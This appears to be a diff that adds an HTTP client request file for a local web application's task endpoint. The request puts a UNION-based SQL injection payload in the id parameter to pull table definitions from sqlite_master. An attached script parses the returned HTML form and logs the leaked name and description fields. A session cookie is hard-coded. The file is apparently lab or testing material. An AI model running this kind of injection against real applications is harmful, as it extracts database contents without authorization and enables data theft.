@@ -1,0 +1,22 @@
+### GET request with a header
+GET http://localhost:8080/task?id=1 AND false UNION SELECT 0,1,name,sql,'4','5',false FROM sqlite_master LIMIT 1 OFFSET 2 --
+Accept: application/json
+Cookie: session-id=43e1e12a-bd45-4aa9-82ff-4396f13edac6
+
+> {%
+    client.test("Headers option exists", function () {
+        let name = ""
+        let desc = ""
+        let lines = String(response.body).split("\n");
+        for (let idx in lines) {
+            let line = lines[idx].trim()
+            if (line.indexOf("id=\"Name\"") > 0) {
+                name = line.substring(line.indexOf("value=")+7).replace("\"", "");
+            }
+            if (line.indexOf("id=\"Description\"") > 0) {
+                desc = line.substring(line.indexOf(">")+1).replace("</textarea>", "")
+                client.log(name + " / " + desc);
+            }
+        }
+    });
+%}
